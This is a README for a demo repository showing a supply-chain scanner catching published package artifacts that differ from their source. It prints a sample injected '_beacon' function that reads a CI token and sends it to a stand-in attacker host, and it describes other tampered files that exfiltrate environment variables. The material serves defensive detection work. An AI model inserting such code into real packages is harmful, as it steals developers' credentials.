# phantom-demo

A runnable demonstration of [`pipebreach/phantom`](https://github.com/pipebreach/phantom):
a supply-chain tool that detects when a package's **published artifact diverges
from its declared source**. This repo proves the tool works end to end, without
publishing anything malicious to a real registry.

It shows two things:

1. **Integration** (`verify-deps` workflow): a real GitHub Actions job that
   consumes the published `pipebreach/phantom@v0.2.0` Action to verify a live
   PyPI dependency and upload SARIF.
2. **Detection** (`scenarios` workflow): controlled, offline scenarios where a
   tampered artifact is scanned against a clean source, covering the full
   finding taxonomy.

## The scenarios

Each folder under `scenarios/` holds a `source/` tree (what the repo declares)
and an `artifact/` tree (what got published). `driver.py` serves both to phantom
through the library API, so the scan is deterministic and needs no network.

| Scenario | What was tampered | phantom verdict |
|----------|-------------------|-----------------|
| `clean` | nothing; artifact matches source (only comments/spacing differ) | no findings, exit 0 |
| `phantom-file` | an extra `_telemetry.py` that reads env vars and POSTs them out | `critical` `phantom_file` |
| `phantom-span` | a `_beacon()` function injected into an existing `core.py` | `critical` `phantom_span` with line numbers |
| `suspicious-pth` | a `.pth` file shipped in the artifact (runs at interpreter startup) | `critical` `suspicious_pth` |
| `npm-injection` | an extra `telemetry.js` exfiltrating `process.env` via `fetch` | `critical` `phantom_file` (npm) |

The point: none of the injected code is flagged for *looking* malicious. It is
flagged because it is not in the source. That is what catches clean, obfuscated,
or never-before-seen injection.

## Seeing a caught attack

`run_all.py` prints, for every scenario, the raw textual difference between the
source and the published artifact, then phantom's verdict on it. The contrast is
the whole demo:

```
=== phantom-span (pypi) ===
difference (naive text diff of source vs published artifact):
    @@ -4,3 +4,14 @@
    +def _beacon():
    +    token = os.environ.get("CI_TOKEN", "")
    +    urllib.request.urlopen("https://c2.evil.invalid/beacon?t=" + token)
    +_beacon()
phantom: 2 finding(s), highest severity critical
  [CRITICAL] phantom_span mylib/core.py:9-14
    vectors: network:urllib.request, env-read:os.environ
```

And on `clean`, the naive diff still shows changes (a maintainer reformatted the
file), but phantom reports **nothing**, because its comparison is semantic
(AST-normalized), not textual:

```
=== clean (pypi) ===
difference (naive text diff of source vs published artifact):
    +# distributed build of mylib.core (comments and spacing differ ...)
    -    return "hello, " + name
    +    return "hello, " + name  # build the greeting
phantom: no findings (artifact matches source)
```

That is the difference between a text diff (noisy, easy to hide in) and
phantom's verdict (semantic, hard to hide from).

## Run it locally

```bash
pip install phantom-scan==0.2.0

# Run every scenario and self-check the verdicts
python run_all.py

# Inspect one scenario (add --json or --sarif)
python driver.py scenarios/phantom-span
python driver.py scenarios/npm-injection --ecosystem npm
```

Example (`scenarios/phantom-span`):

```
CRITICAL  phantom_span  high  mylib/core.py:9-14
    reason: injected top-level code `_beacon` at lines 9-14 of mylib/core.py is
    not present in mylib/core.py of https://github.com/example/mylib@v1.0.0;
    reads local data AND has network egress (exfiltration shape)
```

## How the offline scan works

`driver.py` implements phantom's `Fetcher` and `SourceResolver` interfaces over
local directories and bundles them into a `LocalEcosystem`. `phantom.core.scan()`
speaks only those interfaces, so pointing it at local trees (or, later, a private
registry) needs no change to phantom itself. That is the same plugin seam the
tool uses to add new ecosystems.

## CI

- **`scenarios`** installs `phantom-scan==0.2.0`, runs `run_all.py` (printing
  every difference and phantom's verdict), then runs one tampered scenario
  through the CLI to show phantom exiting non-zero: the log demonstrates what a
  real CI gate looks like when it catches a divergence.
- **`verify-deps`** runs the `pipebreach/phantom@v0.2.0` Action against
  `phantom-scan==0.2.0` itself and uploads SARIF. This is the trusted-dependency
  case: green means the Action integrates and the artifact matches its source.
  The injected-attack side is demonstrated by the controlled scenarios above,
  which do not depend on publishing a malicious package to a real registry.
